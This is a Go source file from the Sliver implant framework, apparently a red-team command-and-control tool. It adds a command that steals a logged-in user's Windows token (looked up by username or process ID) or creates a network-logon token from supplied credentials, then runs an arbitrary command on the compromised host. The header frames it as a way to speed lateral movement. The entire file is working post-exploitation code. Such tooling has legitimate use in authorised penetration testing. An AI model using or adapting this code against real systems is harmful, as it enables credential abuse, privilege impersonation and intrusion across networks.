package privilege

/*
	Sliver Implant Framework - Quick Impersonation Workflow
	Copyright (C) 2024  Bishop Fox / mgstate

	Combined impersonate+action commands for faster lateral movement.
	Supports:
	  - Username + password: creates Type 9 logon (network creds)
	  - Username only: steals existing logged-in user token
	  - PID: resolves owner and steals token
	  - -e flag: execute command immediately after impersonation
*/

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ImpersonateAndExecCmd - Impersonate a user and immediately execute a command
func ImpersonateAndExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	domain, _ := cmd.Flags().GetString("domain")
	execCmd, _ := cmd.Flags().GetString("exec")
	pidStr, _ := cmd.Flags().GetString("pid")

	// If PID provided, resolve to username first
	if pidStr != "" {
		pid, err := strconv.ParseInt(pidStr, 10, 32)
		if err != nil {
			con.PrintErrorf("Invalid PID: %s\n", pidStr)
			return
		}

		psList, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
			Request: con.ActiveTarget.Request(cmd),
		})
		if err != nil {
			con.PrintErrorf("Failed to list processes: %s\n", err)
			return
		}

		for _, proc := range psList.Processes {
			if proc.Pid == int32(pid) {
				owner := proc.Owner
				// Strip domain prefix
				if idx := strings.LastIndex(owner, "\\"); idx >= 0 {
					username = owner[idx+1:]
				} else {
					username = owner
				}
				con.PrintInfof("PID %d -> %s (owner: %s)\n", pid, proc.Executable, owner)
				break
			}
		}
		if username == "" {
			con.PrintErrorf("PID %d not found or no owner\n", pid)
			return
		}
	}

	if username == "" {
		con.PrintErrorf("Must provide -u <username> or -P <PID>\n")
		return
	}

	// Step 1: Create token with credentials if password provided
	if password != "" {
		logonType := "LOGON_NEW_CREDENTIALS" // Type 9 - best for network access
		if _, ok := logonTypes[logonType]; !ok {
			con.PrintErrorf("Invalid logon type\n")
			return
		}

		ctrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Creating token for %s\\%s ...", domain, username), ctrl)

		makeToken, err := con.Rpc.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
			Request:   con.ActiveTarget.Request(cmd),
			Username:  username,
			Domain:    domain,
			Password:  password,
			LogonType: logonTypes[logonType],
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			con.PrintErrorf("Token creation failed: %s\n", err)
			return
		}
		if makeToken.Response != nil && makeToken.Response.GetErr() != "" {
			con.PrintErrorf("Token creation failed: %s\n", makeToken.Response.GetErr())
			return
		}
		con.PrintInfof("Token created for %s\\%s (Type 9 - network creds)\n", domain, username)
	} else {
		// Step 1 alt: Impersonate existing logged-in user
		ctrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Impersonating %s ...", username), ctrl)

		impersonate, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
			Request:  con.ActiveTarget.Request(cmd),
			Username: username,
		})
		ctrl <- true
		<-ctrl

		if err != nil {
			con.PrintErrorf("Impersonation failed: %s\n", err)
			return
		}
		if impersonate.Response != nil && impersonate.Response.GetErr() != "" {
			con.PrintErrorf("Impersonation failed: %s\n", impersonate.Response.GetErr())
			return
		}
		con.PrintInfof("Impersonated %s\n", username)
	}

	// Step 2: Execute command if provided
	if execCmd != "" {
		parts := strings.Fields(execCmd)
		execPath := parts[0]
		var execArgs []string
		if len(parts) > 1 {
			execArgs = parts[1:]
		}

		con.PrintInfof("Executing: %s %s\n", execPath, strings.Join(execArgs, " "))

		execResp, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
			Request: con.ActiveTarget.Request(cmd),
			Path:    execPath,
			Args:    execArgs,
			Output:  true,
		})
		if err != nil {
			con.PrintErrorf("Execution failed: %s\n", err)
			return
		}
		if execResp.Response != nil && execResp.Response.GetErr() != "" {
			con.PrintErrorf("Execution error: %s\n", execResp.Response.GetErr())
			return
		}
		if len(execResp.Stdout) > 0 {
			con.Printf("%s\n", string(execResp.Stdout))
		}
		if len(execResp.Stderr) > 0 {
			con.PrintErrorf("%s\n", string(execResp.Stderr))
		}
	} else {
		con.PrintInfof("Use 'whoami' to verify, 'rev2self' to revert\n")
	}
}
